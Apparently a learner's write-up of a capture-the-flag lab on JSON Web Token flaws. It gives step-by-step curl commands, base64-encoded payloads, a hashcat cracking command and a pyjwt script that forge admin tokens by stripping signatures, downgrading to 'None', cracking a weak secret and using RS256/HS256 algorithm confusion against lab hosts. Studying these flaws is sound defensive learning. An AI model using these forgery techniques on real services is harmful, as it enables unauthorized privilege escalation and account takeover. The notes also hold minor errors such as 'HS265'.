### Example of JWT token:

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 - Header
eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0 - Payload 
UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4 - Signature
```

A JWT consists of three components, each Base64Url encoded and separated by dots:

- **Header** - The header usually indicates the type of token, which is JWT, as well as the signing algorithm that is used.
- **Payload** - The payload is the body of the token, which contain the claims. A claim is a piece of information provided for a specific entity. In JWTs, there are registered claims, which are claims predefined by the JWT standard and public or private claims. The public and private claims are those which are defined by the developer. It is worth knowing the different between public and private claims, but not for security purposes, hence this will not be our focus in this room.
- **Signature** - The signature is the part of the token that provides a method for verifying the token's authenticity. The signature is created by using the algorithm specified in the header of the JWT. Let's dive a bit into the main signing algorithms.

### Signing Algorithms

Although there are several different algorithms defined in the JWT standard, we only really care about three main ones:

- **None** - The None algorithm means no algorithm is used for the signature. Effectively, this is a JWT without a signature, meaning that the verification of the claims provided in the JWT cannot be verified through the signature.
- **Symmetric Signing** - A symmetric signing algorithm, such as HS265, creates the signature by appending a secret value to the header and body of the JWT before generating a hash value. Verification of the signature can be performed by any system that has knowledge of the secret key.
- **Asymmetric Signing** - An asymmetric signing algorithm, such as RS256, creates the signature by using a private key to sign the header and body of the JWT. This is created by generating the hash and then encrypting the hash using the private key. Verification of the signature can be performed by any system that has knowledge of the public key associated with the private key that was used to create the signature.

If using a HS265, may be able to crack this. See below.
### Security in the Signature

JWTs can be encrypted (called JWEs), but the key power of JWTs comes from the signature. Once a JWT is signed, it can be sent to the client, who can use this JWT wherever needed. We can have a centralised authentication server that creates the JWTs used on several applications. Each application can then verify the signature of the JWT; if verified, the claims provided within the JWT can be trusted and acted upon.

### Signature Validation Mistakes
#### Not Verifying the Signature

In the following example, a token is used to authenticate as the user 'user':
```bash
garffff@garffff:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' http://10.10.37.161/api/v1.0/example2?username=user
{
  "message": "Welcome user, you are not an admin"
}
```


We can remove the signature part of the token, and it is still found to be valid:

```bash
garffff@garffff:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.' http://10.10.37.161/api/v1.0/example2?username=user
{
  "message": "Welcome user, you are not an admin"
}
```

We may be able to do privilege escalation on the payload

```bash
eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0 = {"username":"user","admin":0}
```

We can replace 'user' with 'admin' and the '0' with a '1':

```bash
garffff@garffff:~$ echo -n '{"username":"admin","admin":1}' | base64
eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9
```

Sending the modifyed token, confirms we have access to the admin account:

```bash
garffff@garffff:~$ echo -n '{"username":"admin","admin":1}' | base64
eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9
garffff@garffff:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.' http://10.10.37.161/api/v1.0/example2?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}"
}
```

#### Downgrading to None

We can remove the encryption type from the header:

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 = {"typ":"JWT","alg":"HS256"}
```

By setting the 'alg' header to 'none':

```bash
garffff@garffff:~$ echo '{"typ":"JWT","alg":"None"}' | base64
eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0K
```

Next, set the payload to the user we want to priv esc to:

```bash
garffff@garffff:~$ echo '{"username":"admin","admin":1}' | base64
eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9Cg
```

Put it all together:

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9Cg.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4
```

And send:

```bash
garffff@garffff:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9Cg.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' http://10.10.37.161/api/v1.0/example3?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{fb9341e4-5823-475f-ae50-4f9a1a4489ba}"
}
```

#### Weak Symmetric Secrets

If a symmetric signing algorithm is used, the security of the JWT relies on the strength and entropy of the secret used. If a weak secret is used, it may be possible to perform offline cracking to recover the secret. Once the secret value is known, you can again alter the claims in your JWT and recalculate a valid signature using the secret.

```bash
garffff@garffff:~/Downloads$ echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY' > jwt.txt
```

```bash
garffff@garffff:~/Downloads$ hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY:secret
```

With the secret, modify the JWT token using https://jwt.io/

![[Pasted image 20241022153428.png]]

And verify:

```bash
garffff@garffff:~/Downloads$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.R_W3WxiyPIyIaYxD-PCY8PzDxd_DQKNkIDu9_KyzLzU' http://10.10.37.161/api/v1.0/example4?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{e1679fef-df56-41cc-85e9-af1e0e12981b}"
}
```
### Signature Algorithm Confusion

The last common issue with signature validation is when an algorithm confusion attack can be performed. This is similar to the `None` downgrade attack, however, it specifically happens with confusion between symmetric and asymmetric signing algorithms. If an asymmetric signing algorithm, for example, RS256 is used, it may be possible to downgrade the algorithm to HS256. In these cases, some libraries would default back to using the public key as the secret for the symmetric signing algorithm. Since the public key can be known, you can forge a valid signature by using the HS256 algorithm in combination with the public key.

```bash
garffff@garffff:~/Downloads$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password5" }' http://10.10.37.161/api/v1.0/example5
{
  "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q"
}

```

To use the script below, need to install the following:

```bash
garffff@garffff:~$ pip3 install pyjwt==1.5.3
```

Python script:

```bash
import jwt

public_key = "ADD_KEY_HERE"

payload = {
    'username' : 'admin',
    'admin' : 1
}

access_token = jwt.encode(payload, public_key, algorithm="HS256")
print (access_token)
```

Running the script:

```bash
garffff@garffff:~$ python3 secret.py 
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.PqBj1AKVA29470LnE7FbGonZ-NgzDCWhI8C-jr_Rjwc'
```

Verify:

```bash
garffff@garffff:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.PqBj1AKVA29470LnE7FbGonZ-NgzDCWhI8C-jr_Rjwc' http://10.10.42.255/api/v1.0/example5?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{f592dfe2-ec65-4514-a135-70ba358f22c4}"
}
```

